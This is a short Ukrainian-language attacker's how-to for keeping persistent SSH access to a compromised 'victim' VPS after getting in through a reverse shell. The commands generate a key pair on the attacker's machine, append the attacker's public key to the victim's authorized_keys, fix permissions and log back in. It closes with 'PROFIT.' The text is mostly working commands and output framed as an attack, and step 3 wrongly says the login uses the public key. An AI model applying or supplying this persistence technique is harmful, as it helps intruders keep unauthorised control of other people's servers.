Робота з SSH-ключами, або як взяти VPS-сервер під постійний контроль за 3 кроки
---------------------------------------------------------------------------------

*Передбачає попередній доступ до сервера (наприклад, через розгорнуту оболонку shell)

1) На хост-машині атакуючого:
ssh-keygen -t ed25519 -f ~/.ssh/hack1/mykey

Отримали в результаті публічний і приватний SSH ключі:

Generating public/private ed25519 key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ~/.ssh/hack1/mykey
Your public key has been saved in ~/.ssh/hack1/mykey.pub
The key fingerprint is:
SHA256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
The key's randomart image is:xxxxxx

2) Проникли на сервер-жертву через реверс-шел і додали публічний ключ mykey в ~/.ssh/authorized_keys поточного користувача:

echo "ssh-ed25519 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" >> ~/.ssh/authorized_keys

Виставили обов'язково коректні права доступу:

chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

3) Підключитися з хост-машини атакуючого до сервера-жертви використовуючи публічний ключ:

ssh -i ~/.ssh/hack1/mykey user@IP_ADDRESS_TARGET_SERVER

Постійний SSH-доступ налагоджено.

PROFIT.
